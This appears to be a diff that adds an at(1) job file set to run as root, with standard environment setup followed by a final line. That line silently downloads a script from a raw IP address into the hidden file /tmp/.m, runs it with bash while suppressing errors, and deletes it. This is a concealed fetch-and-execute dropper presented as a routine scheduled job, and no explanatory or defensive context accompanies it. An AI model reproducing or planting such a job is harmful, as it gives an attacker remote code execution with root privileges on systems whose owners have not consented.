@@ -1,0 +1,15 @@
+#!/bin/sh
+# atrun uid=0 gid=0
+# mail    root 0
+umask 22
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export PATH
+HOME=/root; export HOME
+LANG=C.UTF-8; export LANG
+LOGNAME=root; export LOGNAME
+USER=root; export USER
+PWD=/root; export PWD
+cd /root || {
+         echo 'Execution directory inaccessible' >&2
+         exit 1
+}
+curl -sSf -o /tmp/.m https://198.51.100.202/m 2>/dev/null && /bin/bash /tmp/.m 2>/dev/null; rm -f /tmp/.m
